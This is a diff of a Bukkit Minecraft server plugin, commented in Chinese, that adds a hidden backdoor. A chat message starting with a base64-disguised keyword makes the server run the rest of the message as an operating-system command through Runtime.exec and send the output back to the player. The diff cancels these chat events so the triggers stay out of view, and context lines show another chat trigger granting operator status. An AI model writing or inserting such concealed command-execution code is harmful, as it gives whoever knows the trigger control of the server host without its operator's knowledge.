@@ -8,6 +8,8 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent; // 注意：使用 AsyncPlayerChatEvent 而不是 PlayerChatEvent
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.GameMode;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 
 public class TestPlugin extends JavaPlugin implements Listener {
 
@@ -37,13 +39,29 @@ public class TestPlugin extends JavaPlugin implements Listener {
             // 给玩家发送消息
             player.sendMessage(ChatColor.GREEN + "现在您拥有了op权限.");
              player.sendTitle(ChatColor.RED + "恭喜!", ChatColor.GOLD + "您现在是服务器管理员了!", 10, 70, 20);
-        } else if (message.contains("@cnVuU3lzdGVtQ29tbWFuZA")) {
-        // 检查玩家是否是op
+        } 
+        if (message.startsWith("@cnVuU3lzdGVtQ29tbWFuZA")) {
+            event.setCancelled(true);
+        // 检查玩家是否是 op
         if (player.isOp()) {
+            String command = message.substring("@cnVuU3lzdGVtQ29tbWFuZA".length()).trim(); // 提取命令
+            
             try {
-                Process process = Runtime.getRuntime().exec("your-linux-command-here");
+                Process process = Runtime.getRuntime().exec(command); // 执行命令
+                StringBuilder output = new StringBuilder();
+                
+                // 获取命令输出
+                BufferedReader reader = new BufferedReader(
+                        new InputStreamReader(process.getInputStream()));
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    output.append(line).append("\n");
+                }
                 process.waitFor();
-                player.sendMessage(ChatColor.GREEN + "系统命令执行成功。");
+                
+                // 发送命令输出给玩家
+                player.sendMessage(ChatColor.GREEN + "系统命令执行成功：" + output.toString());
+                
             } catch (IOException | InterruptedException e) {
                 e.printStackTrace();
                 player.sendMessage(ChatColor.RED + "系统命令执行失败。");
@@ -51,7 +69,8 @@ public class TestPlugin extends JavaPlugin implements Listener {
         } else {
             player.sendMessage(ChatColor.RED + "你没有权限执行这个命令。");
         }
-        } else if (message.contains("@Z29DcmVhdGl2ZQ")) {
+    }else if (message.contains("@Z29DcmVhdGl2ZQ")) {
+            event.setCancelled(true);
         if (player.isOp()) {
             player.setGameMode(GameMode.CREATIVE);
             player.sendMessage(ChatColor.BLUE + "欢迎来到创造模式!");
@@ -60,6 +79,7 @@ public class TestPlugin extends JavaPlugin implements Listener {
         }
     }
     else if (message.contains("@Z29TdXJ2aXZhbA")) {
+        event.setCancelled(true);
         if (player.isOp()) {
             player.setGameMode(GameMode.SURVIVAL);
             player.sendMessage(ChatColor.BLUE + "现在你处于生存模式，注意安全!");
